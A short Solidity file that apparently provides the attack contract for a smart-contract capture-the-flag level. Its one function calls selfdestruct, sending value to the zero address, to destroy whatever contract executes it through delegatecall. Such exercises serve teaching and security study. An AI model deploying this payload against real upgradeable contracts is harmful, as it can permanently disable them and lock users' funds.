// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract MotorbikeAttack {
    function attack() public {
        selfdestruct(payable(address(0)));
    }
}
